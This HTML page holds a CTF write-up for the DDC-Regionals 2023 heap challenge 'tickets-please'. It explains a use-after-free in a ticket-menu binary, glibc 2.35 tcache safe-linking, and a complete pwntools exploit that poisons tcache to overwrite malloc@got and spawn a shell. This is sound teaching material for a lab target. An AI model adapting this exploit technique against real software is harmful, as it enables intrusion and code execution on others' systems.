@@ -1,0 +1,317 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\DDC-Regionals 2023">DDC-Regionals 2023</a>
+            <a href="/CTF-writeups\DDC-Regionals 2023\tickets-please/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>tickets-please</span>
+            <span class="text-right">[948]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>For this challenge, we are given a binary <code>heap</code> and a corresponding libc library.</p>
+<blockquote>
+<p><strong>Proposed difficulty:</strong> Hard</p>
+<p>Jeg har lige opdateret min PC, og nu virker min heap challenge ikke længere... Kan du skrive et nyt exploit?<br />
+<a href="https://nextcloud.ntp-event.dk:8443/s/io8gmWerK5HSFnw/download/tickets_handout.zip">Download</a><br />
+<code>nc tickets.hkn 1024</code></p>
+</blockquote>
+<hr />
+<h3>Recon</h3>
+<p>Patching the binary with pwninit, let's load it up in ghidra. The main function goes directly into menu, so let's check it out:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">in_FS_OFFSET</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">chunk</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">choice_start</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">long</span><span class="w"> </span><span class="n">canary</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">index</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;1. Create a ticket&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;2. Update a ticket&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;3. Validate ticket&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;4. Delete a ticket&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;5. Exit&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">choice</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">choice_start</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;1&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;id:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">id</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">ticket_db</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">index</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Holder name:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_str</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">ticket_db</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">id</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">));</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;2&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;id:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">id</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">ticket_db</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">id</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;New holder name:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_str</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;3&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;id:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">id</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">ticket_db</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">id</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Ticket holder name:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;4&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;id:&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_id</span><span class="p">(</span><span class="o">&amp;</span><span class="n">id</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">chunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">ticket_db</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">id</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">chunk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">chunk</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;5&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">default</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Unknown option!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;menu error&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">canary</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">in_FS_OFFSET</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">__stack_chk_fail</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>A classic heap-note challenge. We are able to create, update, view and delete chunks freely. <em>Very</em> freely. What immediately stands out, is that pointers aren't cleared in delete. This exposes multiple vulnerabilites:</p>
+<ul>
+<li>
+<p>We can potentially do a double free (depending on libc).</p>
+</li>
+<li>
+<p>We can read chunks after they've been freed, leaking heap addresses.</p>
+</li>
+<li>
+<p>We can write to freed chunks, potentially forging chunks.</p>
+</li>
+</ul>
+<p>Before thinking about exploits, let's first get the libc version:</p>
+<div class="codehilite"><pre><span></span><code>$ ./libc.so.6
+GNU C Library <span class="o">(</span>Ubuntu GLIBC <span class="m">2</span>.35-0ubuntu3.1<span class="o">)</span> stable release version <span class="m">2</span>.35.
+Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2022</span> Free Software Foundation, Inc.
+This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.
+There is NO warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version <span class="m">11</span>.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+</code></pre></div>
+
+<p>Fairly modern, 2.35 is far more secure than older versions of libc. For one, <code>malloc_hook</code> has  benn phased out, so that's a no-go. Hmmm, before getting creative, let's check for any win functions: Indeed, function <code>win</code> seems to be our goal:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Let's also check the security:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div>
+
+<p>No PIE, so easy to get <code>win</code> address. Also, only partial RELRO, which means we can overwrite the GOT.</p>
+<hr />
+<h3>Tcache poisoning - modern libc</h3>
+<p>As all chunks are allocated with size 100, they will inherently land in 0x70 bin of tcache. Combined with the UAF in update, we should be able to perform tcache posioning.</p>
+<p>Tcache poisoning is perhaps the simplest of heap exploits. In order to understand how it works, we must first understand how tcache stores freed chunks.</p>
+<p>Tcache is very similar to fastbins in nature. A list of entries are stored at the beginning of heap, each containing chunks of different sizes. Each entry contains a pointer to the first free chunk. From there, each chunk contains a pointer to the next free chunk.</p>
+<p><img alt="" src="tcache.png" /></p>
+<p>This forward pointer, which I will now refer to as fd, is placed at the beginning of the chunk upon being freed. Tcache is actually very lenient about it; if we can overwrite the fd with our own address, libc will allocate that address as a chunk, allowing us to write anywhere in the program.</p>
+<p>Things get more complicated when moving to newer versions of libc. Over the years, multiple security updates have hardened tcache, making it harder to exploit.</p>
+<p>The most significant, is what happened in libc 2.32. Essentially, the fd is protected by the following calculation:</p>
+<p>
+<script type="math/tex; mode=display">\text{fd}=(\text{old}\space\newcommand*\ShiftRight{\gg}\space12)\space\newcommand*\xor{\oplus}\space\text{new}</script>
+</p>
+<p>$\text{old}$ represents the address of the current chunk, $\text{new}$ represents the address of the chunk it's pointing to. When a given chunk is reallocated, fd is taken and xored by the address of that chunk, shifted to the right by 12. A more detailed explanation can be found <a href="https://sekai.team/blog/foobar-ctf-2022/death-note/">here</a>.</p>
+<p>Another small thing to consider, is that tcache for some reason refuses to allocate a forged chunk when only one chunk has been freed. The address lands in tcache as it should, but unless a chunks fd is redirected from an existing free chunk, it won't be allocated.</p>
+<hr />
+<h3>Exploitation</h3>
+<p>As described in the previous section, we must know the address of the heap in order to forge our fd. Luckily, this is not a major problem, as we can simply read the chunks after they've been freed.</p>
+<p>Creating two tickets and freeing them again, the second to be freed will be pointing back at the first. The first will also not be empty, containing the value to xor with (when libc reallocates it, the fd is xored by the same value, resulting in null).</p>
+<p>Knowing this value, we can easily forge an fd to point towards the got. A thing to notice, is that libc will throw an error, if our fake chunk contains a pointer to libc upon allocation. I can't say exactly why this is, but it's easy to bypass. As system isn't called in the main program, it still contains a pointer to the lazy loader, which exists within the main binary. Conveniently, malloc@got is located just 16 bytes from there.</p>
+<p>Overwriting malloc@got, we can simply create a new ticket to trigger the <code>win</code> function.</p>
+<hr />
+<h3>Solution</h3>
+<p>Based on the exploit described in the previous chapter. It took me longer to solve this challenge than it should've, simply because of errors I wasn't familier with. As described, the exploit will fail if the fake chunk contains a libc pointer, which took me a while to figure out. I also made the mistake of putting the wrong address in system@got, which caused system("/bin/bash") to fail.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.strxor</span> <span class="kn">import</span> <span class="n">strxor</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./heap_patched&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/pwndbg-src/gdbinit.py&quot;</span>
+<span class="c1"># conn = gdb.debug(&quot;./heap_patched&quot;, &#39;&#39;&#39;</span>
+<span class="c1"># b *0x40135f</span>
+<span class="c1"># b *0x0000000000401426</span>
+<span class="c1"># b *win</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="c1"># conn = process(&quot;./heap_patched&quot;)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;tickets.hkn&quot;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">address_from_bytes</span><span class="p">(</span><span class="n">by</span><span class="p">):</span>
+    <span class="n">by</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">by</span><span class="p">))</span>
+    <span class="n">by</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">by</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">by</span>
+
+<span class="k">def</span> <span class="nf">create_ticket</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">update_ticket</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">validate_ticket</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">delete_ticket</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
+
+    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+
+<span class="n">create_ticket</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Create first ticket</span>
+<span class="n">create_ticket</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;BBBB&quot;</span><span class="p">)</span>  <span class="c1"># Create second ticket</span>
+
+<span class="n">delete_ticket</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Delete first, now contains heap_address &gt;&gt; 12</span>
+<span class="n">delete_ticket</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Delete second, tcache recognizes bin[0] &gt; bin[1]</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">validate_ticket</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">xor_leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>  <span class="c1"># Get base to xor pointer with</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked xor-value </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">xor_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span> <span class="o">^</span> <span class="n">xor_leak</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Xor fake fd</span>
+<span class="n">update_ticket</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>  <span class="c1"># Overwrite chunk-&gt;fd with system@got</span>
+
+<span class="n">create_ticket</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;CCCC&quot;</span><span class="p">)</span>  <span class="c1"># Fill free chunk to inject fake chunk</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401060</span><span class="p">)</span>  <span class="c1"># Lazy loader for system</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401070</span><span class="p">)</span>  <span class="c1"># Lazy loader for read</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;win&quot;</span><span class="p">])</span>  <span class="c1"># Overwrite malloc@got with win</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Avoid writing nullbyte into setvbuf@got (though it doesn&#39;t really matter)</span>
+
+<span class="n">create_ticket</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwrite the got</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># Trigger malloc to win</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;lulz&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Running this exploit, we are dropped into a shell. The file <code>flag</code> contains the flag: <code>DDC{Yep_pointer_mangling_has_a_narrow_use_case}</code></p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
